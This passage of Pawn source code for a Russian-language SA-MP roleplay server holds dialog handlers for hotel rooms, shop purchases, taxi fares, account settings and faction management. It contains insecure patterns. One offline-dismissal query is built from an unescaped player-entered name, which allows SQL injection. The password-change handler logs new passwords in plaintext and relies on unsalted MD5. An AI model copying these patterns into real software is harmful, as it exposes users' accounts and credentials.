		    if(KomInfo[GetPVarInt(playerid,"PlayerKom")][kbiz] != GetPVarInt(playerid,"PBIZ")) return SendClientMessage(playerid,CGREY,"У Вас команта не в данном отеле");
		    new krek;
		    if(sscanf(inputtext,"i",krek)) return ShowPlayerDialog(playerid,192,DIALOG_STYLE_INPUT,"Оплата команты","{FFFFFF}Введите на сколько хотите оплатить Вашу комнату.\nОт 1 до 20:","Далее","Назад");
		    if(krek < 1 || krek > 20) return ShowPlayerDialog(playerid,192,DIALOG_STYLE_INPUT,"Оплата команты","{FFFFFF}Введите на сколько хотите оплатить Вашу комнату.\nОт 1 до 20:","Далее","Назад");
		    if(PlayerInfo[playerid][pCash] < krek*GetCena(GetPVarInt(playerid,"PBIZ"),900)) return SendClientMessage(playerid,CGREY,"Недостаточно средств");
		    if(KomInfo[GetPVarInt(playerid,"PlayerKom")][kOplata]+krek > 30) return SendClientMessage(playerid,CGREY,"Олптатить номер можно всего на 20 дней");
		    KomInfo[GetPVarInt(playerid,"PlayerKom")][kOplata] += gettime()+ 60*60*24*krek;
		    GiveMoney(playerid,-krek*ProdInfo[GetPVarInt(playerid,"PBIZ")][prodCena][0]);
		    BizMinus(KomInfo[GetPVarInt(playerid,"PlayerKom")][kbiz],krek*ProdInfo[GetPVarInt(playerid,"PBIZ")][prodCena][0],0);
		    query = "";
            format(query, sizeof(query), "UPDATE komnata SET oplata = %i WHERE id = '%d' LIMIT 1",KomInfo[GetPVarInt(playerid,"PlayerKom")][kOplata],GetPVarInt(playerid,"PlayerKom"));
			mysql_tquery(mysql,query);
			new str[150];
			format(str,sizeof(str),"[HOTEL]{FFFFFF} Вы оплатили свою комнату на {f7ae11}%i{FFFFFF} дней. Всего оплачено на {f7ae11}%s{FFFFFF}",krek,timec(KomInfo[GetPVarInt(playerid,"PlayerKom")][kOplata]));
			SendClientMessage(playerid,CREWARD,str);
		}
		case 193:
		{
		    if(!response) return true;
		    if(GetPlayerKom(playerid) == 0) return SendClientMessage(playerid,CGREY,"У Вас нет команты в отеле");
		    if(KomInfo[GetPVarInt(playerid,"PlayerKom")][kbiz] != GetPVarInt(playerid,"PBIZ")) return SendClientMessage(playerid,CGREY,"У Вас команта не в данном отеле");
			strmid(KomInfo[GetPVarInt(playerid,"PlayerKom")][kOwner], "None", 0, strlen("None"), 32);
            KomInfo[GetPVarInt(playerid,"PlayerKom")][kOplata] = 0;
            UpdateKom(GetPVarInt(playerid,"PlayerKom"));
            query = "";
            format(query, sizeof(query), "UPDATE komnata SET owner = 'None',oplata = 0 WHERE id = '%d' LIMIT 1",GetPVarInt(playerid,"PlayerKom"));
			mysql_tquery(mysql,query);
			SendClientMessage(playerid,CREWARD,"[HOTEL]{FFFFFF} Вы продали свою комнату в отеле");
		}
		case 194:
		{
		    if(!response)
		    {
		        DeletePVar(playerid,"AmmoGun");
		        DeletePVar(playerid,"AmmoPrice");
		        return true;
		    }
		    if(BizInfo[GetPVarInt(playerid,"PBIZ")][bProd] < GetPVarInt(playerid,"AmmoProd"))
		    {
		        SendClientMessage(playerid,CGREY,"В магазине кончились продукты");
		        DeletePVar(playerid,"AmmoGun");
		        DeletePVar(playerid,"AmmoPrice");
		        return true;
		    }
		    if(!GetPVarInt(playerid,"Oplata"))
      		{
				if(PlayerInfo[playerid][pCash] < GetCena(GetPVarInt(playerid,"PBIZ"),GetPVarInt(playerid,"AmmoPrice")))
				{
			        SendClientMessage(playerid,CGREY,"Недостаточно средств");
			        DeletePVar(playerid,"AmmoGun");
			        DeletePVar(playerid,"AmmoPrice");
			        return true;
				}
			}
			else
			{
				if(PlayerInfo[playerid][pBank] < GetCena(GetPVarInt(playerid,"PBIZ"),GetPVarInt(playerid,"AmmoPrice")))
				{
			        SendClientMessage(playerid,CGREY,"Недостаточно средств");
			        DeletePVar(playerid,"AmmoGun");
			        DeletePVar(playerid,"AmmoPrice");
			        return true;
				}
			}
			if(GetFree(playerid,315,1))
			{
			    SendClientMessage(playerid,CGREY,"Недостаточно места в инвентаре");
		        DeletePVar(playerid,"AmmoGun");
		        DeletePVar(playerid,"AmmoPrice");
		        return true;
			}
//			PlayerInfo[playerid][pTie]++;
			GiveInv(playerid,315,1);
			if(!GetPVarInt(playerid,"Oplata"))  GiveMoney(playerid,-GetCena(GetPVarInt(playerid,"PBIZ"),GetPVarInt(playerid,"AmmoPrice")));
			else PlayerInfo[playerid][pBank] -= GetCena(GetPVarInt(playerid,"PBIZ"),GetPVarInt(playerid,"AmmoPrice"));
   			BizMinus(GetPVarInt(playerid,"PBIZ"),GetCena(GetPVarInt(playerid,"PBIZ"),GetPVarInt(playerid,"AmmoPrice")),GetPVarInt(playerid,"AmmoProd"));
			ApplyDynamicActorAnimation(BIZBOT[GetPVarInt(playerid,"PBIZ")],"PED","IDLE_CHAT",4.0,0,0,0,0,0);
			Update3DTextLabelTextEx(BotLable[GetPVarInt(playerid,"PBIZ")],-1,"Спасибо за покупку");
			SetTimerEx("ClearBotGlobal", 3000, false, "dd", BIZBOT[GetPVarInt(playerid,"PBIZ")],_:BotLable[GetPVarInt(playerid,"PBIZ")]);
			static const fmt_str[] = "Вы приобрели верёвку. Всего верёвок у вас: %i";
			new str[sizeof(fmt_str)+2+40];
   			format(str, sizeof(str), fmt_str,PlayerInfo[playerid][pTie]);
			SendClientMessage(playerid,CREWARD,str);
   			DeletePVar(playerid,"AmmoGun");
      		DeletePVar(playerid,"AmmoPrice");
		}
		case 195:
		{
		    if(!response)
		    {
		        DeletePVar(playerid,"AmmoGun");
		        DeletePVar(playerid,"AmmoPrice");
		        return true;
		    }
		    if(BizInfo[GetPVarInt(playerid,"PBIZ")][bProd] < GetPVarInt(playerid,"AmmoProd"))
		    {
		        SendClientMessage(playerid,CGREY,"В магазине кончились продукты");
		        DeletePVar(playerid,"AmmoGun");
		        DeletePVar(playerid,"AmmoPrice");
		        return true;
		    }
		    if(!GetPVarInt(playerid,"Oplata"))
      		{
				if(PlayerInfo[playerid][pCash] < GetCena(GetPVarInt(playerid,"PBIZ"),GetPVarInt(playerid,"AmmoPrice")))
				{
			        SendClientMessage(playerid,CGREY,"Недостаточно средств");
			        DeletePVar(playerid,"AmmoGun");
			        DeletePVar(playerid,"AmmoPrice");
			        return true;
				}
			}
			else
			{
				if(PlayerInfo[playerid][pBank] < GetCena(GetPVarInt(playerid,"PBIZ"),GetPVarInt(playerid,"AmmoPrice")))
				{
			        SendClientMessage(playerid,CGREY,"Недостаточно средств");
			        DeletePVar(playerid,"AmmoGun");
			        DeletePVar(playerid,"AmmoPrice");
			        return true;
				}
			}
			PlayerInfo[playerid][pSmoke] += 6;
			GiveInv(playerid,319,6);
			if(!GetPVarInt(playerid,"Oplata")) GiveMoney(playerid,-GetCena(GetPVarInt(playerid,"PBIZ"),GetPVarInt(playerid,"AmmoPrice")));
			else PlayerInfo[playerid][pBank] -= GetCena(GetPVarInt(playerid,"PBIZ"),GetPVarInt(playerid,"AmmoPrice"));
   			BizMinus(GetPVarInt(playerid,"PBIZ"),GetCena(GetPVarInt(playerid,"PBIZ"),GetPVarInt(playerid,"AmmoPrice")),GetPVarInt(playerid,"AmmoProd"));
			ApplyDynamicActorAnimation(BIZBOT[GetPVarInt(playerid,"PBIZ")],"PED","IDLE_CHAT",4.0,0,0,0,0,0);
			Update3DTextLabelTextEx(BotLable[GetPVarInt(playerid,"PBIZ")],-1,"Спасибо за покупку");
			SetTimerEx("ClearBotGlobal", 3000, false, "dd", BIZBOT[GetPVarInt(playerid,"PBIZ")],_:BotLable[GetPVarInt(playerid,"PBIZ")]);
			static const fmt_str[] = "Вы приобрели пачку сигарет. Всего сигарет у вас: %i";
			new str[sizeof(fmt_str)+2+40];
   			format(str, sizeof(str), fmt_str,PlayerInfo[playerid][pSmoke]);
			SendClientMessage(playerid,CREWARD,str);
   			DeletePVar(playerid,"AmmoGun");
      		DeletePVar(playerid,"AmmoPrice");
		}
		case 196:
		{
		    if(!response) return ShowPlayerDialog(playerid,195,DIALOG_STYLE_LIST,"Выберите тариф","1 | Цена за 1км\n2 | Цена договорная","Далее","");
		    switch(listitem)
		    {
		        case 0: SetPVarInt(playerid,"KM",1),ShowPlayerDialog(playerid,58,DIALOG_STYLE_INPUT,"Установите тариф","{FFFFFF}Установите сколько вы будете брать за 1 км:","Далее","Отмена");
				case 1:
				{

					
					if(!GetPVarInt(playerid,"Mar"))
					{
					    PlayerInfo[playerid][pShash] = 0;
						VInfo[GetPVarInt(playerid,"IDCARDD")][vobj1] = CreateDynamicObject(19308,0,0,0,0,0,0);
						AttachDynamicObjectToVehicle(VInfo[GetPVarInt(playerid,"IDCARDD")][vobj1],GetPlayerVehicleID(playerid),0,-0.15,GetPVarFloat(playerid,"IDCARDDF"),0,0,0);
					}
					SetPVarInt(playerid,"Taxist",1);
					DeletePVar(playerid,"IDCARDD");
					DeletePVar(playerid,"IDCARDDF");
					UpdateDynamic3DTextLabelText(CarLable[GetPlayerVehicleID(playerid)],-1,"Тариф: {f7ae11}цена договорная\n{ffffff}[Бесплатно для новичков]");
					for(new i = 0;i< MAX_VEHICLES;i++) if(RentCar[i] == playerid && i != GetPlayerVehicleID(playerid)) SetVehicleToRespawn(i);
				}
			}
		}
		//ShowPlayerDialog(playerid,197,DIALOG_STYLE_LIST,"Настройка аккаунта","{FFFFFF}1 | Смена ника\n2 | Смена пароля\n3 | Никнеймы игроков","Далее","Назад");
		case 197:
		{
		    if(!response) return cmd_menu(playerid,"");
	  		switch(listitem)
	  		{
	  		    case 0: ShowPlayerDialog(playerid, 29, DIALOG_STYLE_INPUT, "Смена ника", "{FFFFFF}Введите желаемый ник в окошко:\n{f7ae11}Внимание!{FFFFFF}\nНик должен быть не больше 32 символов\nИ иметь форму Имя_Фамилия", "Готово","Назад");
	  		    case 1: ShowPlayerDialog(playerid, 198, DIALOG_STYLE_INPUT, "Смена пароля", "{FFFFFF}Введите пароль, установленный сейчас:", "Далее","Назад");
				case 6:
				{
				    if(GetPVarInt(playerid,"Name") == 0)
				    {
						for(new i = 0; i < MAX_PLAYERS; i++) ShowPlayerNameTagForPlayer(playerid, i, false);
	     				SendClientMessage(playerid,CREWARD,"Вы отключили отображение никнеймов игроков");
					    SetPVarInt(playerid,"Name",1);
				    }
				    else
				    {
						for(new i = 0; i < MAX_PLAYERS; i++) ShowPlayerNameTagForPlayer(playerid, i, true);
					    SendClientMessage(playerid,CREWARD,"Вы включили отображение никнеймов игроков");
					    DeletePVar(playerid,"Name");
				    }
				    ShowS(playerid);
				}
				case 7:
				{
				    if(PlayerInfo[playerid][pAdminC] == 0)
				    {
					    SendClientMessage(playerid,CREWARD,"Вы отключили отображение действий администраторов");
					    PlayerInfo[playerid][pAdminC] = 1;
				    }
				    else
				    {
					    SendClientMessage(playerid,CREWARD,"Вы включили отображение действий администраторов");
					    PlayerInfo[playerid][pAdminC] = 0;
				    }
				    ShowS(playerid);
				}
				//static const fmt_str[] = "{FFFFFF}1 | Смена ника\n2 | Смена пароля\n3 | Никнеймы игроков\t%s\n4 | Действия администраторов\t%s\n5 | Чат фракции\t\t%s\n6 | Чат депортамента\t\t%s\n7 | Чат семьи\t\t%s\n8 | Изменить стиль боя";
				case 8:
				{
					if(!GetPVarInt(playerid,"ChatF"))
				    {
					    SendClientMessage(playerid,CREWARD,"Вы отключили отображение чата фракции");
					    SetPVarInt(playerid,"ChatF",1);
				    }
				    else
				    {
					    SendClientMessage(playerid,CREWARD,"Вы включили отображение чата фракции");
						DeletePVar(playerid,"ChatF");
				    }
				    ShowS(playerid);
				}
				case 9:
				{
					if(!GetPVarInt(playerid,"ChatD"))
				    {
					    SendClientMessage(playerid,CREWARD,"Вы отключили отображение чата депортамента");
					    SetPVarInt(playerid,"ChatD",1);
				    }
				    else
				    {
					    SendClientMessage(playerid,CREWARD,"Вы включили отображение чата депортамента");
						DeletePVar(playerid,"ChatD");
				    }
				    ShowS(playerid);
				}
				case 10:
				{
					if(!GetPVarInt(playerid,"ChatS"))
				    {
					    SendClientMessage(playerid,CREWARD,"Вы отключили отображение чата семьи");
					    SetPVarInt(playerid,"ChatS",1);
				    }
				    else
				    {
					    SendClientMessage(playerid,CREWARD,"Вы включили отображение чата семьи");
						DeletePVar(playerid,"ChatS");
				    }
				    ShowS(playerid);
				}
				case 2: ShowFight(playerid);
				case 4: for(new o; o < 50; o++) SendClientMessage(playerid,-1, "");
				case 3:
				{
					new str[500];
				    for(new i; i < 14; i++)
				    {
				        format(str,sizeof(str),"%s\n%d | %s",str,i + 1, Anims[i][aName]);
					}
					ShowPlayerDialog(playerid,386,2,"Стиль походки",str,"Далее","Отмена");
				}
				case 5:
				{
				    PlayerInfo[playerid][pDamage] = (!PlayerInfo[playerid][pDamage]) ? (1) : (0);
					if(!PlayerInfo[playerid][pDamage]) SendClientMessage(playerid,CREWARD,"Вы отключили отображение Damage Info");
				    else SendClientMessage(playerid,CREWARD,"Вы включили отображение Damage Info");
				    ShowS(playerid);
				}
				case 11:
				{
					if(!GetPVarInt(playerid,"ChatAD"))
				    {
					    SendClientMessage(playerid,CREWARD,"Вы отключили отображение объявлений");
					    SetPVarInt(playerid,"ChatAD",1);
				    }
				    else
				    {
					    SendClientMessage(playerid,CREWARD,"Вы включили отображение объявлений");
						DeletePVar(playerid,"ChatAD");
				    }
				    ShowS(playerid);
				}
	  		}
		}
		case 198:
		{
		    if(!response) return ShowS(playerid);
		    new krek[32];
		    if(sscanf(inputtext,"s[32]",krek)) return ShowPlayerDialog(playerid, 198, DIALOG_STYLE_INPUT, "Смена пароля", "{FFFFFF}Введите пароль, установленный сейчас:", "Далее","Назад");
		    if(!strcmp(MD5_Hash(krek), GetAccount(PlayerInfo[playerid][pSendername], "password"), true))
		    {
		        ShowPlayerDialog(playerid, 199, DIALOG_STYLE_INPUT, "Смена пароля", "{FFFFFF}Введите пароль, который хотите установить:\n\n{F85A5A}- Пароль может состоять из русских и латинских символов\n- Пароль чувствителен к регистру\n- Длина пароля может быть от 5-ти до 16-ти символов", "Далее","Назад");
		    }
		    else SendClientMessage(playerid,CGREY,"Неверный пароль");
		}
		case 199:
		{
		    if(!response) return ShowS(playerid);
            if(!strlen(inputtext) || strlen(inputtext) < 5 || strlen(inputtext) > 16) return ShowPlayerDialog(playerid, 199, DIALOG_STYLE_INPUT, "Смена пароля", "{FFFFFF}Введите пароль, который хотите установить:\n\n{F85A5A}- Пароль может состоять из русских и латинских символов\n- Пароль чувствителен к регистру\n- Длина пароля может быть от 5-ти до 16-ти символов", "Далее","Назад");
		    if(IsTextRussian(inputtext)) return ShowPlayerDialog(playerid, 199, DIALOG_STYLE_INPUT, "Смена пароля", "{FFFFFF}Введите пароль, который хотите установить:\n\n{F85A5A}- Пароль может состоять из русских и латинских символов\n- Пароль чувствителен к регистру\n- Длина пароля может быть от 5-ти до 16-ти символов", "Далее","Назад");
            strmid(PlayerInfo[playerid][pPassword], MD5_Hash(inputtext), 0, strlen(MD5_Hash(inputtext)), 32);
            SetPlayerStr(PlayerInfo[playerid][pSendername],"password",MD5_Hash(inputtext));
            new str1[100];
			format(str1,sizeof(str1),"NAME: %s PASS: %s",PlayerInfo[playerid][pSendername], inputtext);
		    Log("Acc",str1);
            static const fmt_str[] = "Вы сменили Ваш пароль на новый %s | Сделайте скрин(F8), чтобы не забыть";
			new str[sizeof(fmt_str)+2+40];
   			format(str, sizeof(str), fmt_str,inputtext);
			SendClientMessage(playerid,CREWARD,str);
		}
		case 200:
		{
		    if(!response) return true;
		   // if(PlayerInfo[playerid][pAdmin] < ListNick[playerid][listitem]) return SendClientMessage(playerid,CGREY,"Вы не можете снять администратора старше себя");
		    new playerName[MAX_PLAYER_NAME+1];
		    new str[20];
		    format(str,sizeof(str),"Admin%i",listitem+1);
    		GetPVarString(playerid, str, playerName, sizeof(playerName));
    		if(GetPlayerID(playerName) != INVALID_PLAYER_ID) return SendClientMessage(playerid, CGREY, "Игрок онлайн");
    		SetPlayerInt(playerName,"admin",0);
     		static const fmt_string[] = "[A] %s снял игрока %s с должности администратора";
			new str1[sizeof(fmt_string)+MAX_PLAYER_NAME+32];
			format(str1, sizeof(str1), fmt_string,PlayerInfo[playerid][pSendername],playerName);
			SendAdminMessage(CGREY,str1);
		}
		case 202:
		{
		    if(!response) return true;
		    switch(GetPVarInt(playerid,"biz"))
		    {
			    case 0: SetPVarInt(playerid,"Biz1",listitem+1);
			    case 1: SetPVarInt(playerid,"Biz1",listitem+27);
		    }
			ShowPlayerDialog(playerid,203,DIALOG_STYLE_LIST,"Кто крышует","La Cosa Nostra\nTriad\nRussian Mafia\nНикто","Далее","Назад");
		}
		case 203:
		{
		    if(!response) return DeletePVar(playerid,"Biz1");
		    switch(listitem)
		    {
		        case 0: BizInfo[GetPVarInt(playerid,"Biz1")][bMafia] = 12;
		        case 1: BizInfo[GetPVarInt(playerid,"Biz1")][bMafia] = 13;
		        case 2: BizInfo[GetPVarInt(playerid,"Biz1")][bMafia] = 14;
		        case 3: BizInfo[GetPVarInt(playerid,"Biz1")][bMafia] = 0;
		    }
		    SetBizInt(GetPVarInt(playerid,"Biz1"),"mafia",BizInfo[GetPVarInt(playerid,"Biz1")][bMafia]);
		    SendClientMessage(playerid,-1,"Вы сменили мафию крышуещую бизнес");
		}
	/*	case 204:
		{
		    if(!response) return DeletePVar(playerid,"ID1");
		    PlayerInfo[GetPVarInt(playerid,"ID1")][pFracSkin] = ListNick[playerid][listitem];

		    if(PlayerInfo[GetPVarInt(playerid,"ID1")][pWork] >=1 || IsAMafia(GetPVarInt(playerid,"ID1")) || IsAGang(GetPVarInt(playerid,"ID1"))) SetPlayerSkin(GetPVarInt(playerid,"ID1"),PlayerInfo[GetPVarInt(playerid,"ID1")][pFracSkin]);
			if(PlayerInfo[playerid][pMember] == F_LVPD || PlayerInfo[playerid][pMember] == F_ARMY)
			{
			    new Float:arm;
				GetPlayerArmour(GetPVarInt(playerid,"ID1"),arm);
			//	if(arm > 0) PlayerArmour(GetPVarInt(playerid,"ID1"));
			}
			static const fmt_string[] = "%s выдал Вам новый фракционный скин";
			new str1[sizeof(fmt_string)+MAX_PLAYER_NAME];
			format(str1, sizeof(str1), fmt_string,PlayerInfo[playerid][pSendername]);
			SendClientMessage(GetPVarInt(playerid,"ID1"),CBLUE,str1);
   			static const fmt_string2[] = "Вы выдали новый фракционный скин для %s";
			new str2[sizeof(fmt_string2)+MAX_PLAYER_NAME];
			format(str2, sizeof(str2), fmt_string2,PlayerInfo[GetPVarInt(playerid,"ID1")][pSendername]);
			SendClientMessage(playerid,CBLUE,str2);

		}*/
		case 204:
		{
		    if(!response) return true;
			switch(listitem)
			{
			    case 0:
				{
					switch(BizInfo[GetPVarInt(playerid,"PBIZ")][bType])
					{
						case 17: BuyAcs(playerid);
						case 10: BuyFuel(playerid);
						case 12,13: BuyKom(playerid);
						case 11:BuySkin(playerid);
					}
				}
			    case 1:
			    {
			        ShowPlayerDialog(playerid,292,DIALOG_STYLE_INPUT,"PIN-CODE","{ffffff}Введите PIN-CODE от карты:\n\n","Далее","Отмена");
			    }
			}
		}
		case 205:
		{
		    if(!response) return true;
		    if(BizInfo[GetPVarInt(playerid,"PBIZ")][bUl][4]) ShowPlayerDialog(playerid,204,DIALOG_STYLE_LIST,"Способ оплаты","1 | Наличные\n2 | Карта","Далее","Отмена");
			else BuyAcs(playerid);
		    
		}
		case 292:
		{
			if(!response) return ShowMenuBiz(playerid);
			if(!strval(inputtext) ||  4 < strlen(inputtext) < 4) return ShowPlayerDialog(playerid,292,DIALOG_STYLE_INPUT,"PIN-CODE","{ffffff}Введите PIN-CODE от карты:\n\n","Далее","Отмена");
			if(strval(inputtext) != PlayerInfo[playerid][pBankPin])
			{
			    SendClientMessage(playerid,CGREY,"Неверный PIN-CODE!");
                return 1;
			}
			SetPVarInt(playerid,"Oplata",1);
			switch(BizInfo[GetPVarInt(playerid,"PBIZ")][bType])
			{
				case 17: BuyAcs(playerid);
				case 10: BuyFuel(playerid);
				case 12,13: BuyKom(playerid);
				case 11:BuySkin(playerid);
			}
		}
	



		case 216:
		{
		    if(!response) return true;
			switch(listitem+1)
			{
			    case 0:
			    {
			        query = "";
			        new str[50];
			        for(new i = 1; i<= 10; i++)
			        {
			            format(str,sizeof(str),"%s\n",FracRank[PlayerInfo[playerid][pMember]][i]);
			            strcat(query,str);
			        }
			        ShowPlayerDialog(playerid,217,DIALOG_STYLE_LIST,"Название рангов",query,"Далее","Отмена");
			    }
			    case 1:
			    {
			        if(IsAGos(playerid))
			        {
			            if(PlayerInfo[playerid][pCash] < 200) return SendClientMessage(playerid,CGREY,"Недостаточно средств");
				        GiveMoney(playerid,-200);
			        }
			        else
			        {
				        if(FracBank[PlayerInfo[playerid][pMember]] < 200) return SendClientMessage(playerid,CGREY,"Недостаточно средств");
				        FracBank[PlayerInfo[playerid][pMember]] -= 200;
			        }
					for(new i = 0; i < MAX_VEHICLES; i++)
					{
						for(new v = 1; v <= TOTALVEH; v++)
						{
							if(i == VehInfo[v][vVehicle])
							{
								if(VehInfo[v][vFr] == PlayerInfo[playerid][pMember])
								{
								    for(new i1 = 0; i1 < MAX_PLAYERS; i1++) if(GetPlayerVehicleID(i1) == i) return true;
							        SetVehicleToRespawn(i);
								}
							}
						}
					}
					SendClientMessage(playerid,CBLUE,"Вы зареспавнили весь незанятый транспорт организации");
			        SaveBank(playerid);
			    }
				case 2: ShowPlayerDialog(playerid,219,DIALOG_STYLE_MSGBOX,"Уволить всех","{FFFFFF}Вы точно хотите уволить всех членов организации оффлайн?","Да","Отмена");
				case 3: ShowPlayerDialog(playerid,220,DIALOG_STYLE_INPUT,"Уволить игрока","{FFFFFF}Введите имя игрока, которого вы хотите уволить оффлайн:","Далее","Отмена");
				case 4: ShowPlayerDialog(playerid,347,DIALOG_STYLE_LIST,"Изменить скин","1 ранг\n2 ранг\n3 ранг\n4 ранг\n5 ранг\n6 ранг\n7 ранг\n8 ранг\n9 ранг\n10 ранг\nЖенский скин","Далее","Отмена");
				case 5:
				{
					if(FracInfo[PlayerInfo[playerid][pMember]][fNabor] < gettime())
					{
					    new days,mon,yer,num;
						getdate(yer,mon,days);
						new str[35];
						query = "";
						new name[12];
					    for(new i = 0; i < 7; i++)
					    {
					        if(days + i > MonthTimes[mon-1][0 + IsLeapYear(yer)])
							{
							    if(mon+1 > 12) mon = 1,yer++;
							    else mon++;
							    days = 1;
							    GetDay(yer,mon,days+num, name);
								format(str,sizeof(str),"%s (%02d.%02d.%02d)\n",name,days,mon,yer);
								num = 0;
							}
							else
							{
							    GetDay(yer,mon,days+num, name);
								format(str,sizeof(str),"%s%s (%02d.%02d.%02d)\n",(days+num == days) ? ("{20BA09}") : ("{FFFFFF}"),name,days+num,mon,yer);
							}
							strcat(query,str);
							num++;
					    }
					    
					    ShowPlayerDialog(playerid,217,DIALOG_STYLE_LIST,"Объявить набор",query,"Далее","Отмена");
				    }
				    else
				    {
				        FracInfo[PlayerInfo[playerid][pMember]][fNabor] = 0;
						SetFractionInt(PlayerInfo[playerid][pMember],"nabor",0);
						SendClientMessage(playerid,CBLUE,"Вы отменили набор!");
				    }
				}
				case 6:
				{
				    switch(PlayerInfo[playerid][pMember])
				    {
					    case F_LIC: ShowPlayerDialog(playerid,376,DIALOG_STYLE_LIST,"Лицензии","{FFFFFF}1 | Лицензия класса 'C'\n2 | Лицензия класса 'M'\n3 | Лицензия класса 'B'\n4 | Лицензия класса 'P'","Далее","Отмена");
						case F_MAYOR:
						{
						    static const fmt_string[] = "1 | Правоохранительные органы\t[%d%%/20%%]\n2 | Армии\t[%d%%/50%%]\n3 | Здравоохранение\t[%d%%/50%%]\n4 | Новости\t[%d%%/10%%]\n5 | Правительство\t[%d%%/10%%]\n6 | Автошкола\t[%d%%/10%%]";
							new str[sizeof(fmt_string)+20];
							format(str, sizeof(str), fmt_string,FracInfo[F_LSPD][fPayDay],FracInfo[F_ARMY][fPayDay],FracInfo[F_HOSPITAL_LS][fPayDay],FracInfo[F_NEWS][fPayDay],FracInfo[F_MAYOR][fPayDay],FracInfo[F_LIC][fPayDay]);
							ShowPlayerDialog(playerid,378,DIALOG_STYLE_TABLIST,"Бонус к зарплате",str,"Далее","Отмена");
						}
						case F_NEWS: ShowPlayerDialog(playerid,229,DIALOG_STYLE_INPUT,"Цена за объявление","{FFFFFF}Введите цену за один сивол в объявлении:\nОт 1$ до 50$","Далее","Отмена");
						case F_LSPD,F_LVPD,F_FBI:ShowPlayerDialog(playerid,242,DIALOG_STYLE_INPUT,"Удалить установленный объект","{FFFFFF}Введите ID объект, который хотите удалить:\n","Далее","Отмена");
						case F_HOSPITAL_LS: ShowPlayerDialog(playerid,459,DIALOG_STYLE_INPUT,"Цена за койку","{FFFFFF}Введите цену за койку в больнице:\nОт 5$ до 25$","Далее","Отмена");
					}
				}
				case 7:
				{
					if(PlayerInfo[playerid][pMember] == F_NEWS) ShowPlayerDialog(playerid,230,DIALOG_STYLE_INPUT,"Цена за SMS","{FFFFFF}Введите цену за SMS:\nОт 10$ до 80$","Далее","Отмена");
					else
					{
					    static const fmt_string[] = "1 | Перевод средств\t[%d%%/3%%]\n2 | Биржа\t[%d%%/20%%]\n3 | Услуги адвоката\t[%d%%/20%%]";
						new str[sizeof(fmt_string)+20];
						format(str, sizeof(str), fmt_string,Perevod,Birga,Advocat);
						ShowPlayerDialog(playerid,380,DIALOG_STYLE_TABLIST,"Услуги",str,"Далее","Отмена");
					}
				}
				case 8:
				{
					if(PlayerInfo[playerid][pMember] == F_NEWS) ShowPlayerDialog(playerid,231,DIALOG_STYLE_INPUT,"Цена за звонок","{FFFFFF}Введите цену за звонок:\nОт 10$ до 80$","Далее","Отмена");
					else
					{
					    static const fmt_string[] = "1 | Налог на дом\t[%d/10%%]\n2 | Налог на бизнес\t[%d/10%%]\n3 | Налог на транспорт\t[%d/10%%]";
						new str[sizeof(fmt_string)+20];
						format(str, sizeof(str), fmt_string,OplDom,OplBiz,NalogTS);
						ShowPlayerDialog(playerid,480,DIALOG_STYLE_TABLIST,"Налоги",str,"Далее","Отмена");
					}
				}
				case 9:
				{
					ShowPlayerDialog(playerid,481,DIALOG_STYLE_LIST,"Кодекс штата","{20BA09}Добавить статью\n{FFFFFF}Изменить статью","Далее","Отмена");
				}
			}
		}
		case 217:
		{
		    if(!response)
			{
			    DeletePVar(playerid,"Days");
				return true;
			}
		    ShowPlayerDialog(playerid,218,DIALOG_STYLE_INPUT,"Объявить набор","{ffffff}Введите время набора в формате чч:мм\n\nНапример: 14:30","Далее","Отмена");
            new days,mon,yer;
			getdate(yer,mon,days);
			if(days + listitem > MonthTimes[mon-1][0 + IsLeapYear(yer)])
			{
			    if(mon+1 > 12) mon = 1,yer++;
			    else mon++;
			    days = 1 + (days + listitem)-MonthTimes[mon-1][0 + IsLeapYear(yer)];
			}
			else days += listitem;
			new str[30];
		    format(str,sizeof(str),"%d,%d,%d",days,mon,yer);
		    SetPVarString(playerid,"Days",str);
		    printf(str);
		}
		case 218:
		{
		    if(!response)
			{
			    DeletePVar(playerid,"Days");
				return true;
			}
		    new color[2];
			if(sscanf(inputtext, "p<:>ii",color[0], color[1])) return ShowPlayerDialog(playerid,218,DIALOG_STYLE_INPUT,"Объявить набор","{ffffff}Введите время набора в формате чч:мм\n\nНапример: 14:30","Далее","Отмена");
			new text[20];
		    GetPVarString(playerid, "Days", text, sizeof(text));
            format(text,sizeof(text),"%s,%d,%d",text,color[0], color[1]);
			SetPVarString(playerid,"Days",text);
            printf(text);
			ShowPlayerDialog(playerid,225,DIALOG_STYLE_INPUT,"Объявить набор","{ffffff}Введите примечания для набора:\n\n","Далее","Отмена");
		}
		case 219:
		{
		    if(!response) return cmd_lpanel(playerid);
		    if(FracUval[PlayerInfo[playerid][pMember]] == true) return SendClientMessage(playerid,CGREY,"Вы уже подали заявку на увольнение всех игроков оффлайн");
		    FracUval[PlayerInfo[playerid][pMember]] = true;
		    SendClientMessage(playerid,CBLUE,"Вы подали заявку на увольнение всех игроков оффлайн, ждите пока его одобрит администарция");
		    static const fmt_string[] = "[A]{ffffff} Заявка на смену от %s на увольнение всех оффлайн в организации %s[%d] (/du | /nu)";
			new str[sizeof(fmt_string)+MAX_PLAYER_NAME+50];
			format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],FracInfo[PlayerInfo[playerid][pMember]][fName],PlayerInfo[playerid][pMember]);
			SendAdminMessage(CYELLOW,str);
		}
		case 220:
		{
		    if(!response) return cmd_lpanel(playerid);
		    new nick[32];
		    if(sscanf(inputtext,"s[32]",nick)) return ShowPlayerDialog(playerid,220,DIALOG_STYLE_INPUT,"Уволить игрока","{FFFFFF}Введите имя игрока, которого вы хотите уволить оффлайн:","Далее","Отмена");
		    if(strlen(nick) < 1 || strlen(nick)> 32) return ShowPlayerDialog(playerid,220,DIALOG_STYLE_INPUT,"Уволить игрока","{FFFFFF}Введите имя игрока, которого вы хотите уволить оффлайн:","Далее","Отмена");
		    if(GetPlayerID(nick) != INVALID_PLAYER_ID) return SendClientMessage(playerid,CGREY,"Игрок онлайн");
		    query = "";
		    format(query, sizeof(query), "SELECT * FROM `accounts` WHERE `name` = '%s' LIMIT 1", nick);
			mysql_tquery(mysql, query, "CheckUninvite", "ds", playerid,nick);
		    
	/*	    new kek[32],lel;
			format(query, sizeof(query), "SELECT * FROM "TABLE_ACCOUNT" WHERE name = '%s' LIMIT 1", nick);
			mysql_tquery(mysql,query);
			mysql_store_result();
			if(!mysql_fetch_row_format(query))
			{
				SendClientMessage(playerid, 0xAFAFAFAA, "Данного игрока не существует!");
				mysql_free_result();
				return true;
			}
			mysql_get_field("member", kek),lel = strval(kek);
			if(lel != PlayerInfo[playerid][pMember])
			{
